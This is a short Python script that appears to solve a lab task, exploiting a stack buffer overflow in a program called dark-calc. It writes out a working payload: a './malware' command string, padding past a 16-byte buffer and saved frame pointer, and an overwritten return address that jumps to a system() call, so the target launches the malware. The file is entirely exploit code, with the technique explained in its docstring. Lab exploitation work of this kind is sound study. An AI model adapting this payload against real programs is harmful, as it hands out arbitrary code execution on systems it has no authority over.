#!/usr/bin/env python3
"""Task 1: exploit the stack buffer overflow in attack/dark-calc.

`input()` does `strcpy(command_buf, expression)` before returning.  The payload
starts with the string "./malware\0" (strcpy copies it into the global
`command_buf`) and then overflows the 16-byte stack buffer to overwrite the
saved return address with 0x401a6b:

    0x401a6b: mov edi, 0x6030d0   ; edi = command_buf
    0x401a70: call system@plt     ; system("./malware")

so dark-calc itself becomes the parent of `./malware`.
"""
import struct
import sys

CMD = b"./malware\x00"           # copied into command_buf by strcpy()
RET2SYSTEM = 0x401A6B            # mov edi, 0x6030d0; call system@plt

payload = CMD
payload += b"A" * (24 - len(payload))     # 16-byte buffer + 8-byte saved rbp
payload += struct.pack("<Q", RET2SYSTEM)  # overwrite input()'s return address

sys.stdout.buffer.write(payload)
